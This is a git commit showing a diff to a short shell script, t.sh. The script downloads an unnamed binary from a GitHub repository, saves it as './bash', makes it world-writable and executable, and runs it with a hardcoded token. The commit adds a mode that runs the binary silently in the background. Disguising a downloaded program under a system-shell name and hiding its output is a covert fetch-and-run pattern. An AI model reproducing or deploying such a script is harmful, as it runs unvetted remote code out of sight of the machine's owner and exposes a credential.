4a2f2ddd8cb1e001987116f4e0889956ac30eaaf
hanrzme <marcgrosier@live.cn>
2025-04-10 11:20:26 +0800

    Update t.sh

--- t.sh
+++ t.sh
@@ -4,5 +4,9 @@ token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
 tmp="$(mktemp -d)" && cd "$tmp"
 wget -qO "./bash" https://github.com/hanrzme/meme/raw/refs/heads/main/tm20250312
 chmod 777 "./bash"
-./bash start accept --token "${token}"
-#./bash start accept --token "${token}" >/dev/null 2>&1
+if [ "$1" == "1" ]; then
+  ./bash start accept --token "${token}" 2>&1 &
+  ./bash start accept --token "${token}" 2>&1
+else
+  ./bash start accept --token "${token}" >/dev/null 2>&1 &
+fi
